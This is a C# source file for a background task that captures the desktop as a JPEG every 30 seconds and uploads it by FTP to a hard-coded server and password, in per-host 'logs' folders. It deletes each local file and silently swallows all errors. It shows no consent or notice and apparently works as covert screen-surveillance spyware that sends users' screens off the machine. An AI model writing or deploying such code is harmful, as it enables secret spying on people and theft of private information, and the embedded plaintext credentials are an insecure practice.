using System;
using System.Threading;

namespace CaptureAndSend
{
	/// <summary>
	/// Summary description for CaptureAndSendTask.
	/// </summary>
	public class CaptureAndSendTask
	{
		System.Threading.Thread threadClock = null;
		string nameOfFile = "";
		FtpClient ftp = null;
		
		public void Start() 
		{
			ftp = new FtpClient("192.168.0.20","planobe","planobe");

			threadClock = new Thread( new ThreadStart( CaptureJPGAndSendFTP ) );
			threadClock.IsBackground = true;
			threadClock.Start();

		}
		
		private void CaptureJPGAndSendFTP()
		{
			while (true) 
			{
				try
				{
					nameOfFile = string.Format(	"{0}.{1}.{2} - {3}.{4}.{5}.jpg",	DateTime.Now.Year,
																					DateTime.Now.Month.ToString().PadLeft(2,'0'), 
																					DateTime.Now.Day.ToString().PadLeft(2,'0'),
																					DateTime.Now.Hour.ToString().PadLeft(2,'0'), 
																					DateTime.Now.Minute.ToString().PadLeft(2,'0'), 
																					DateTime.Now.Second.ToString().PadLeft(2,'0'));
				
					//capture a JPG 
					System.Drawing.Image fileImage = (System.Drawing.Image)ScreenCapturing.GetDesktopWindowCaptureAsBitmap();
					fileImage.Save( this.nameOfFile , System.Drawing.Imaging.ImageFormat.Jpeg );
					
					//send a JPG to FTP Server
					ftp.Login();
					this.CreateFolder();
					ftp.Upload(nameOfFile);
					ftp.Close();

					System.IO.FileInfo file = new System.IO.FileInfo(this.nameOfFile);
					file.Delete();
				}

				catch {}

				finally
				{
					GC.Collect();
					Thread.Sleep(30000);
				}
			}
		}

		public void SingleCaptureJPGAndSendFTP(string ftphost,string username,string password) 
		{
			try
			{
				ftp = new FtpClient(ftphost,username,password);
				nameOfFile = string.Format(	"{0}.{1}.{2} - {3}.{4}.{5}.jpg",	DateTime.Now.Year,
					DateTime.Now.Month.ToString().PadLeft(2,'0'), 
					DateTime.Now.Day.ToString().PadLeft(2,'0'),
					DateTime.Now.Hour.ToString().PadLeft(2,'0'), 
					DateTime.Now.Minute.ToString().PadLeft(2,'0'), 
					DateTime.Now.Second.ToString().PadLeft(2,'0'));

				//capture a JPG 
				//System.Drawing.Image fileImage = (System.Drawing.Image)ScreenCapturing.GetDesktopWindowCaptureAsBitmap();
				System.Drawing.Image fileImage = (System.Drawing.Image)CaptureScreen.GetDesktopImage();
				fileImage.Save( this.nameOfFile , System.Drawing.Imaging.ImageFormat.Jpeg );

				//send a JPG to FTP Server
				ftp.Login();
				this.CreateFolder();
				ftp.Upload(nameOfFile);
				ftp.Close();

				System.IO.FileInfo file = new System.IO.FileInfo(this.nameOfFile);
				file.Delete();
			}

			catch {}

			finally 
			{
				GC.Collect();
			}
		}

		public void CreateFolder() 
		{
			string nameOfDirectory = string.Format(	"{0}.{1}.{2}", 
				DateTime.Now.Year.ToString().PadLeft(2,'0'),
				DateTime.Now.Month.ToString().PadLeft(2,'0'),
				DateTime.Now.Day.ToString().PadLeft(2,'0'));
			string nameOfDirectoryRoot = string.Format ("logs_{0}",System.Net.Dns.GetHostName());
			
			try {ftp.MakeDir(nameOfDirectoryRoot);} 
			catch {}
			try {ftp.ChangeDir(nameOfDirectoryRoot);} 
			catch {}
			try {ftp.MakeDir(nameOfDirectory);} 
			catch {}
			try {ftp.ChangeDir(nameOfDirectory);} 
			catch {}
		}
	}
}
